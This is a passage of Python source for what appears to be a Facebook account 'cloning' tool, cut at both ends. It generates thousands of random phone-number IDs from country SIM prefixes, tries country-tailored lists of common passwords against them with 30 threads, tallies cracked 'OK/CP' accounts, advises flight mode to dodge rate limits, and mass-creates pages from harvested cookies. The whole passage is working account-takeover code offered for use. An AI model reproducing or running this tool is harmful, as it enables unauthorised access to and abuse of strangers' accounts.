random.shuffle(sample_list)
    final_string = ''.join(sample_list)
    return final_string

def fucker():
	fuckingPass = input(' Enter Password : ')
	if fuckingPass in ['0']:
		exit()
	elif fuckingPass in ["@Janiyy##"]:
		clear()
	else:
		print(" Your Password is Wrong !!")
		exit()
		
#▬▭▬▭▬▭▬▭[MAIN MENU]▬▭▬▭▬▭▬▭#
def rmx_main():
            clear()
          #  fucker()
            print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \x1b[38;5;46mFILE CLONING ')
            print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \x1b[38;5;46mRANDOM CLONING ')
            print('\033[1;97m[\x1b[38;5;46m3\033[1;97m] \x1b[38;5;46mGMAIL CLONING ')
            print('\033[1;97m[\x1b[38;5;46m4\033[1;97m] \x1b[38;5;46mOLD CLONING ')
            print('\033[1;97m[\x1b[38;5;46m5\033[1;97m] \x1b[38;5;46mNEW ACCOUNT GENERATOR ')
            print('\033[1;97m[\x1b[38;5;46m6\033[1;97m] \x1b[38;5;46mFIX CP ')
            print('\033[1;97m[\x1b[38;5;46m7\033[1;97m] \x1b[38;5;46mFILE MAKING ')
            print('\033[1;97m[\x1b[38;5;46m8\033[1;97m] \x1b[38;5;46mAUTO SHARE ')
            print('\033[1;97m[\x1b[38;5;46m9\033[1;97m] \x1b[38;5;46mAUTO CREATE PAGE ');linex()
            error=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
            if error in ['1','01']:
                clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : /sdcard/File.txt etc..');linex()
                file = input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mPUT FILE PATH\033[1;97m:\x1b[38;5;46m ')
                try:fo = open(file,'r').read().splitlines()
                except FileNotFoundError:print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;160mFILE LOCATION NOT FOUND ');time.sleep(1);rmx_main()
                clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mALL METHOD WORKING');linex()
                print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mMETHOD ')
                print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \033[1;97mMETHOD ')
                print('\033[1;97m[\x1b[38;5;46m3\033[1;97m] \033[1;97mMETHOD ')
                print('\033[1;97m[\x1b[38;5;46m4\033[1;97m] \033[1;97mMETHOD ')
                print('\033[1;97m[\x1b[38;5;46m5\033[1;97m] \033[1;97mMETHOD ');linex()
                mthd=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
                plist = []
                clear()
                print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mAUTO PASSWORD')
                print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \033[1;97mCHOICE PASSWORD');linex()
                passlist=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
                if passlist in ['1','01']:
                   clear()
                   print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mAUTO BANGLADESH PASSLIST')
                   print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \033[1;97mAUTO NEPAL PASSLIST')
                   print('\033[1;97m[\x1b[38;5;46m3\033[1;97m] \033[1;97mAUTO PAKISTAN PASSLIST')
                   print('\033[1;97m[\x1b[38;5;46m4\033[1;97m] \033[1;97mAUTO INDIA PASSLIST')
                   print('\033[1;97m[\x1b[38;5;46m5\033[1;97m] \033[1;97mAUTO PHILIPPINES PASSLIST');linex()
                   countrypasslist=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
                   if countrypasslist in ['1','01']:plist.append('firstlast');plist.append('first10');plist.append('first4321');plist.append('first last');plist.append('first12');plist.append('first123');plist.append('first1234');plist.append('first1122');plist.append('first1212');plist.append('first12345');plist.append('first112233');plist.append('first@123');plist.append('first@12345');plist.append('first321');plist.append('first2025');plist.append('first@1122');plist.append('first@1212');plist.append('first111');plist.append('first098');plist.append('@first@');plist.append('first@#');plist.append('first@2025');plist.append('first@@@');plist.append('first112233');plist.append('@1234@');plist.append('@12345@');plist.append('@123456@');plist.append('@@@###');plist.append('@@@@####');plist.append('000999');plist.append('22558800');plist.append('99887766');plist.append('09876543')
                   elif countrypasslist in ['2','02']:plist.append('first123');plist.append('first12345');plist.append('first@123');plist.append('first last');plist.append('firstlast123');plist.append('last12345');plist.append('last@123');plist.append('first1234');plist.append('first@last');plist.append('firstlast');plist.append('last@first');plist.append('nepal123');plist.append('nepal12345');plist.append('Nepal@123');plist.append('Nepal@12345');plist.append('first@12345');plist.append('lastfirst');plist.append('maya123');plist.append('maya12345');plist.append('kathmandu');plist.append('I love you')
                   elif countrypasslist in ['3','03']:plist.append('first last');plist.append('firstlast');plist.append('firstlast1');plist.append('firstlast123');plist.append('first123');plist.append('first@123');plist.append('first1234');plist.append('khan khan');plist.append('khan786');plist.append('khan1122');plist.append('first1122');plist.append('first786');plist.append('firstlast@12');plist.append('First Last');plist.append('khan123');plist.append('khan1234');plist.append('khan@123');plist.append('khan@786');plist.append('khan@1122');plist.append('pak123');plist.append('pak12345');plist.append('pak123456');plist.append('pak123456789');plist.append('pakistan123');plist.append('pakistan12345');plist.append('pakistan123456');plist.append('pakistan123456789')
                   elif countrypasslist in ['4','04']:plist.append('57575751');plist.append('first last');plist.append('57273200');plist.append('59039200');plist.append('07860786');plist.append('firstlast');plist.append('md first');plist.append('mdfirst');plist.append('first12');plist.append('first 25');plist.append('firstlast123');plist.append('first 123');plist.append('first@12345');plist.append('first123');plist.append('first@123');plist.append('@first123');plist.append('first12');plist.append('first123456');plist.append('first 12345');plist.append('first@12');plist.append('firstlast@123');plist.append('first 1234');plist.append('first123456789');plist.append('first last');plist.append('57273200');plist.append('59039200');plist.append('07860786');plist.append('firstlast');plist.append('md first');plist.append('mdfirst');plist.append('first12');plist.append('first 25');plist.append('firstlast123');plist.append('first 123');plist.append('first@12345');plist.append('first123');plist.append('first@123');plist.append('@first123');plist.append('first12');plist.append('first123456');plist.append('first 12345');plist.append('first@12');plist.append('firstlast@123');plist.append('first 12345');plist.append('first 1234');plist.append('first123456789')
                   elif countrypasslist in ['5','05']:plist.append('first last');plist.append('last first');plist.append('firstlast');plist.append('lastfirst');plist.append('firstfirst');plist.append('lastlast');plist.append('firstlast123');plist.append('firstlast12345');plist.append('firstlast123456');plist.append('firstlast123456789');plist.append('firstlast143');plist.append('lastfirst123');plist.append('lastfirst12345');plist.append('lastfirst123456');plist.append('lastfirst123456789');plist.append('lastfirst143');plist.append('first123');plist.append('first12345');plist.append('first123456');plist.append('first123456789');plist.append('first143');plist.append('last123');plist.append('last12345');plist.append('last123456');plist.append('last123456789');plist.append('last143');plist.append('firstpogi');plist.append('firstganda')
                else:
                       clear()
                       try:ps_limit=int(input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mHOW MANY PASSWORDS DO YOU WANT TO ADD ? \033[1;97m:\x1b[38;5;46m '))
                       except:ps_limit=1
                       clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : first last,firstlast,first123');linex()
                       for i in range(ps_limit):plist.append(input(f'\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mPASSWORD {i+1}\033[1;97m:\x1b[38;5;46m '))
                clear()
                cx=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mDO YOU WENT SHOW CP ACCOUNT? \033[1;97m[\x1b[38;5;46mY\033[1;97m|\x1b[38;5;160mN\033[1;97m] : ')
                if cx in ['y','Y','yes','Yes','1']:pcp.append('y')
                else:pcp.append('n')
                with tred(max_workers=30) as crack_submit:
                    clear();total_ids=str(len(fo))
                    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL ACCOUNT IDS \033[1;97m:\x1b[38;5;46m '+total_ids+f' ');print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mUSE FLIGHT MODE FOR SPEED UP');linex()
                    for user in fo:
                        ids,names=user.split('|');passlist=plist
                        if mthd in ['1','01']:crack_submit.submit(api1,ids,names,passlist)
                        elif mthd in ['2','02']:crack_submit.submit(api2,ids,names,passlist)
                        elif mthd in ['3','03']:crack_submit.submit(api3,ids,names,passlist)
                        elif mthd in ['4','04']:crack_submit.submit(api4,ids,names,passlist)
                        elif mthd in ['5','05']:crack_submit.submit(api5,ids,names,passlist)
                print('\033[1;37m');linex()
                print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTHE PROCESS HAS COMPLETED')
                print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)));linex()
                input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mPRESS ENTER TO BACK ')
                rmx_main()
            elif error in ['2','02']:randm()
            elif error in ['3','03']:gmail()
            elif error in ['4','04']:old()
            elif error in ['5','05']:create_new()
            elif error in ['6','06']:fixcp()
            elif error in ['7','07']:file_making()
            elif error in ['8','08']:share_fb()
            elif error in ['9','09']:create_page()
            elif error in ['0','00']:exit('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mTHANKS FOR USE🥰 ')
            else:print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;160mOPTION NOT FOUND IN MENU...');time.sleep(2);rmx_main()
#▬▭▬▭▬▭▬▭[RANDOM CLONING]▬▭▬▭▬▭▬▭#
def randm():
    clear()
    print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mBANGLADESH CLONING')
    print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \033[1;97mPAKISTAN CLONING')
    print('\033[1;97m[\x1b[38;5;46m3\033[1;97m] \033[1;97mNEPAL CLONING')
    print('\033[1;97m[\x1b[38;5;46m4\033[1;97m] \033[1;97mINDIAN CLONING')
    print('\033[1;97m[\x1b[38;5;46m5\033[1;97m] \033[1;97mAFGHANISTAN CLONING')
    print('\033[1;97m[\x1b[38;5;46m6\033[1;97m] \033[1;97mPHILIPPINES CLONING');linex()
    option=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
    if option in ['1','01']:bdx()
    elif option in ['2','02']:pakistanx()
    elif option in ['3','03']:nepalx()
    elif option in ['4','04']:indiax()
    elif option in ['5','05']:afghanistanx()
    elif option in ['6','06']:phx()
    else:randm()
#▬▭▬▭▬▭▬▭[BANGLADESH]▬▭▬▭▬▭▬▭#
def bdx():
    user=[]
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 017 | 019 | 016 | 018');linex()
    code=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mSIM CODE : ')
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 20000 | 30000 | 99999');linex()
    try:limit=int(input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mLIMIT : '))
    except ValueError:limit=50000
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mALL METHOD WORKING');linex()
    print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m3\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m4\033[1;97m] \033[1;97mMETHOD');linex()
    mthdx=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
    for nmbr in range(limit):nmp=''.join(random.choice(string.digits) for _ in range(8));user.append(nmp)
    with tred(max_workers=30) as rmxx:
        clear();tl=str(len(user));print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL ACCOUNT IDS \033[1;97m:\x1b[38;5;46m '+tl+f' ');print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mUSE FLIGHT MODE FOR SPEED UP');linex()
        for love in user:
            ids=code+love;passlist=[love,ids,ids[:7],ids[:6],ids[5:],ids[4:],'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire','57575751','57273200','i love you','iloveyou','59039200','708090']
            if mthdx in ['1','01']:rmxx.submit(rmx1,ids,passlist)
            elif mthdx in ['2','02']:rmxx.submit(rmx2,ids,passlist)
            elif mthdx in ['3','03']:rmxx.submit(rmx3,ids,passlist)
            elif mthdx in ['4','04']:rmxx.submit(rmx4,ids,passlist)
            #elif mthdx in ['5','05']:rmxx.submit(api5,ids,passlist)
            #elif mthdx in ['6','06']:rmxx.submit(api6,ids,passlist)
    print('\033[1;37m');linex()
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTHE PROCESS HAS COMPLETED')
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)));linex()
    input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mPRESS ENTER TO BACK ')
    rmx_main()
#▬▭▬▭▬▭▬▭[PAKISTAN]▬▭▬▭▬▭▬▭#
def pakistanx():
    user=[]
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 0306 | 0315 | 0300 | 0345');linex()
    code=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mSIM CODE : ')
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 20000 | 30000 | 99999');linex()
    try:limit=int(input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mLIMIT : '))
    except ValueError:limit=50000
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mALL METHOD WORKING');linex()
    print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m3\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m4\033[1;97m] \033[1;97mMETHOD');linex()
    mthdx=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
    for nmbr in range(limit):nmp=''.join(random.choice(string.digits) for _ in range(7));user.append(nmp)
    with tred(max_workers=30) as rmxx:
        clear();tl=str(len(user));print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL ACCOUNT IDS \033[1;97m:\x1b[38;5;46m '+tl+f' ');print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mUSE FLIGHT MODE FOR SPEED UP');linex()
        for love in user:
            ids=code+love;passlist=[love,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
            if mthdx in ['1','01']:rmxx.submit(rmx1,ids,passlist)
            elif mthdx in ['2','02']:rmxx.submit(rmx2,ids,passlist)
            elif mthdx in ['3','03']:rmxx.submit(rmx3,ids,passlist)
            elif mthdx in ['4','04']:rmxx.submit(rmx4,ids,passlist)
            #elif mthdx in ['5','05']:rmxx.submit(api5,ids,passlist)
            #elif mthdx in ['6','06']:rmxx.submit(api6,ids,passlist)
    print('\033[1;37m');linex()
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTHE PROCESS HAS COMPLETED')
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)));linex()
    input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mPRESS ENTER TO BACK ')
    rmx_main()
#▬▭▬▭▬▭▬▭[NEPAL]▬▭▬▭▬▭▬▭#
def nepalx():
    user=[]
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 9815 | 9840 | 9816 | 9814');linex()
    code=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mSIM CODE : ')
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 20000 | 30000 | 99999');linex()
    try:limit=int(input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mLIMIT : '))
    except ValueError:limit=50000
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mALL METHOD WORKING');linex()
    print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m3\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m4\033[1;97m] \033[1;97mMETHOD');linex()
    mthdx=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
    for nmbr in range(limit):nmp=''.join(random.choice(string.digits) for _ in range(6));user.append(nmp)
    with tred(max_workers=30) as rmxx:
        clear();tl=str(len(user));print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL ACCOUNT IDS \033[1;97m:\x1b[38;5;46m '+tl+f' ');print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mUSE FLIGHT MODE FOR SPEED UP');linex()
        for love in user:
            ids=code+love;passlist=[ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
            if mthdx in ['1','01']:rmxx.submit(rmx1,ids,passlist)
            elif mthdx in ['2','02']:rmxx.submit(rmx2,ids,passlist)
            elif mthdx in ['3','03']:rmxx.submit(rmx3,ids,passlist)
            elif mthdx in ['4','04']:rmxx.submit(rmx4,ids,passlist)
            #elif mthdx in ['5','05']:rmxx.submit(api5,ids,passlist)
            #elif mthdx in ['6','06']:rmxx.submit(api6,ids,passlist)
    print('\033[1;37m');linex()
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTHE PROCESS HAS COMPLETED')
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)));linex()
    input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mPRESS ENTER TO BACK ')
    rmx_main()
#▬▭▬▭▬▭▬▭[INDIAN]▬▭▬▭▬▭▬▭#
def indiax():
    user=[]
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : +91639 | +98282 | +92628 | +92627');linex()
    code=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mSIM CODE : ')
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 20000 | 30000 | 99999');linex()
    try:limit=int(input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mLIMIT : '))
    except ValueError:limit=50000
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mALL METHOD WORKING');linex()
    print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m3\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m4\033[1;97m] \033[1;97mMETHOD');linex()
    mthdx=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
    for nmbr in range(limit):nmp=''.join(random.choice(string.digits) for _ in range(7));user.append(nmp)
    with tred(max_workers=30) as rmxx:
        clear();tl=str(len(user))
        print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL ACCOUNT IDS \033[1;97m:\x1b[38;5;46m '+tl+f' ');print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mUSE FLIGHT MODE FOR SPEED UP');linex()
        for love in user:
            ids=code+love;passlist=[love,ids,ids[:7],ids[:6],love[1:],"57273200","5757575"]
            if mthdx in ['1','01']:rmxx.submit(rmx1,ids,passlist)
            elif mthdx in ['2','02']:rmxx.submit(rmx2,ids,passlist)
            elif mthdx in ['3','03']:rmxx.submit(rmx3,ids,passlist)
            elif mthdx in ['4','04']:rmxx.submit(rmx4,ids,passlist)
            #elif mthdx in ['5','05']:rmxx.submit(api5,ids,passlist)
            #elif mthdx in ['6','06']:rmxx.submit(api6,ids,passlist)
    print('\033[1;37m');linex()
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTHE PROCESS HAS COMPLETED')
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)));linex()
    input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mPRESS ENTER TO BACK ')
    rmx_main()
#▬▭▬▭▬▭▬▭[AFGHANISTAN]▬▭▬▭▬▭▬▭#
def afghanistanx():
    user=[]
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : +9340 | +9350 | +9332 | +9330');linex()
    code=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mSIM CODE : ')
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 20000 | 30000 | 99999');linex()
    try:limit=int(input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mLIMIT : '))
    except ValueError:limit=50000
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mALL METHOD WORKING');linex()
    print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m3\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m4\033[1;97m] \033[1;97mMETHOD');linex()
    mthdx=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
    for nmbr in range(limit):nmp=''.join(random.choice(string.digits) for _ in range(8));user.append(nmp)
    with tred(max_workers=30) as rmxx:
        clear();tl=str(len(user));print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL ACCOUNT IDS \033[1;97m:\x1b[38;5;46m '+tl+f' ');print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mUSE FLIGHT MODE FOR SPEED UP');linex()
        for love in user:
            ids=code+love;passlist=[love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
            if mthdx in ['1','01']:rmxx.submit(rmx1,ids,passlist)
            elif mthdx in ['2','02']:rmxx.submit(rmx2,ids,passlist)
            elif mthdx in ['3','03']:rmxx.submit(rmx3,ids,passlist)
            elif mthdx in ['4','04']:rmxx.submit(rmx4,ids,passlist)
            #elif mthdx in ['5','05']:rmxx.submit(api5,ids,passlist)
            #elif mthdx in ['6','06']:rmxx.submit(api6,ids,passlist)
    print('\033[1;37m');linex()
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTHE PROCESS HAS COMPLETED')
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)));linex()
    input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mPRESS ENTER TO BACK ')
    rmx_main()
#▬▭▬▭▬▭▬▭[PHILIPPINES]▬▭▬▭▬▭▬▭#
def phx():
    user=[]
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 63977 | 63966 | 63970 | 639771');linex()
    code=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mSIM CODE : ')
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 20000 | 30000 | 99999');linex()
    try:limit=int(input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mLIMIT : '))
    except ValueError:limit=50000
    clear()
    print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m3\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m4\033[1;97m] \033[1;97mMETHOD');linex()
    mthdx=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
    for nmbr in range(limit):nmp=''.join(random.choice(string.digits) for _ in range(8));user.append(nmp)
    with tred(max_workers=30) as rmxx:
        clear();tl=str(len(user))
        print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL ACCOUNT IDS \033[1;97m:\x1b[38;5;46m '+tl+f' ');print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mUSE FLIGHT MODE FOR SPEED UP');linex()
        for love in user:
            ids=code+love;passlist=[love,ids,'magandaako','gandako','pogiako','pogiako123','gwapoako123','gwapoako','iloveyou','i love you','cuteko','cuteko123','cuteko143','mahal123','mahal143','iloveyou143','maganda123','maganda143','pogi123','pogi143']
            if mthdx in ['1','01']:rmxx.submit(rmx1,ids,passlist)
            elif mthdx in ['2','02']:rmxx.submit(rmx2,ids,passlist)
            elif mthdx in ['3','03']:rmxx.submit(rmx3,ids,passlist)
            elif mthdx in ['4','04']:rmxx.submit(rmx4,ids,passlist)
            #elif mthdx in ['5','05']:rmxx.submit(api5,ids,passlist)
            #elif mthdx in ['6','06']:rmxx.submit(api6,ids,passlist)
    print('\033[1;37m');linex()
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTHE PROCESS HAS COMPLETED')
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)));linex()
    input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mPRESS ENTER TO BACK ')
    rmx_main()
#▬▭▬▭▬▭▬▭[GMAIL CLONING]▬▭▬▭▬▭▬▭#
def gmail():print("\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mWAIT FOR NEXT UPDATE");exit()
#▬▭▬▭▬▭▬▭[FIX CP]▬▭▬▭▬▭▬▭#
def fixcp():print("\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mWAIT FOR NEXT UPDATE");exit()
#▬▭▬▭▬▭▬▭[FILE MAKING]▬▭▬▭▬▭▬▭#
def file_making():print("\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mWAIT FOR NEXT UPDATE");exit()
#▬▭▬▭▬▭▬▭[AUTO SHARE]▬▭▬▭▬▭▬▭#
def share_fb():print("\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mWAIT FOR NEXT UPDATE");exit()
#▬▭▬▭▬▭▬▭[CREATE PAGE]▬▭▬▭▬▭▬▭#
def create_page():
    clear()
    xd = input(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mENTER FILE LOCATION \033[1;97m:\x1b[38;5;46m ")
    linex()
    first = input(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mENTER FIRST NAME \033[1;97m:\x1b[38;5;46m ")
    middle = input(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mENTER MIDDLE NAME \033[1;97m:\x1b[38;5;46m ")
    last = input(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mENTER LAST NAME \033[1;97m:\x1b[38;5;46m ")
    clear()
    ck=[]
    with open(xd,'r') as file:
        for line in file:
            ck.append(line.split("|")[0].strip())
    dl = input(f'\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mHOW MANY PAGES TO CREATE \033[1;97m:\x1b[38;5;46m ')
    linex()
    def delay(dl):
        t = datetime.now().strftime("%H:%M")
        for remaining_time in range(int(dl), 0, -1):
            print(f'\r\033[1;97mTASK STARTING IN {remaining_time} SECONDS...', end='\r')
            sleep(5)
    dem=0
    for cookies in ck:
        rmx_xd=first
        rmx_xd1=middle
        rmx_xd2=last
        name=str(rmx_xd+' '+rmx_xd1+' '+rmx_xd2)
        dem +=1
        try:
            result=reg_pro5(cookies,name).Reg()
            print(f'\x1b[38;5;46m[{dem}] SUCCESSFULLY TO CREATED PAGE : {result}\nFBLINK : facebook.com//{result}')
        except Exception as e:pass
        delay(dl)
#▬▭▬▭▬▭▬▭[OLD CLONING]▬▭▬▭▬▭▬▭#
def old():
    clear()
    print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97m100002/3/4 SERIES')
    print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \033[1;97m2009 SERIES');linex()
    _input=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
    if _input in ['1','01']:old_tow()
